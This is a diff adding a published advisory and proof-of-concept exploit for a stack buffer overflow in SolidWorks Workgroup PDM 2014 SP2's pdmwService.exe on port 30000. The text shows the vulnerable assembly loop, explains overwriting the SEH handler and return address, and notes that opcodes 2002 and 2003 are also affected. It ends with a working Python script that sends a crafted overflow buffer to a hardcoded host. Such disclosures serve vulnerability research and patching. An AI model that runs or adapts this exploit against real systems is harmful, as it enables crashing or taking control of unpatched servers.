@@ -1,0 +1,69 @@
+'''
+# Exploit Title: SolidWorks Workgroup PDM 2014 SP2 Opcode 2001 Remote Code Execution Vulnerability
+# Date: 2-18-2014
+# Author: Mohamed Shetta
+Email: mshetta |at| live |dot| com
+# Vendor Homepage: http://www.solidworks.com/sw/products/product-data-management/workgroup-pdm.htm
+# Tested on: Windows 7
+#Vulnerability type: Remote Code Execution
+#Vulnerable file: pdmwService.exe
+#PORT: 30000
+
+
+---------------------------------------------------------------------------------------------------------
+Software Description:
+
+SolidWorks Workgroup PDM is a PDM tool that allows SolidWorks users operating in teams of 10 members or less to work on designs concurrently. With SolidWorks PDM Workgroup, designers can search, revise, and vault CAD data while maintaining an accurate design history.
+
+
+---------------------------------------------------------------------------------------------------------
+Vulnerability Details:
+
+A stack buffer overflow occurs when copying a user supplied input to a fixed size stack buffer without boundary check leading to overwrite the SEH and the return address.
+The copying procedure stops when a null word is found and no size check is proceeded.
+
+
+-----------------------------------------------------------------------------------------------------------
+Vulnerable Code:
+EAX contains the User supplied data.
+
+004E0C50 |> /0FB708 /MOVZX ECX,WORD PTR DS:[EAX] ; Copying To Fixed Size Buffer
+004E0C53 |. |66:890C02 |MOV WORD PTR DS:[EDX+EAX],CX
+004E0C57 |. |83C0 02 |ADD EAX,2
+004E0C5A |. |66:85C9 |TEST CX,CX
+004E0C5D |.^\75 F1 \JNZ SHORT 004E0C50 ; pdmwServ.004E0C50
+
+
+------------------------------------------------------------------------------------------------------------
+PoC:
+
+The PoC attacks both the SEH and Return address, overwriting them with 0x00401000.
+To demonstrate the vulnerability easily SEH will be used to take control of EIP.
+
+The exception will be triggered by 0x004B9CB6 Because another read attempt is made that fails because of read time out error. This behavior is intended by the attacker to trigger the exception.
+
+------------------------------------------------------------------------------------------------------------
+Further attack vectors:
+
+Opcodes 2002 and 2003 are vulnerable too.
+
+------------------------------------------------------------------------------------------------------------
+Disclosure timeline:
+
+12/15/2013 - Vendor notified and no response.
+2/18/2014 - Public disclosure
+'''
+
+#!/usr/bin/env python
+  
+import socket
+
+Shell="A"*2060
+EIP="\x00\x10\x40\x00"
+buff="\xD1\x07\x00\x00" + "\x1C\x08\x00\x00" + Shell + EIP + "\x90\x90\x90\x90\x90\x90\x90\x90" + EIP
+          #OpCode                        Size of the next data                                   Junk
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.0.3", 30000))
+s.send(buff)
+
+
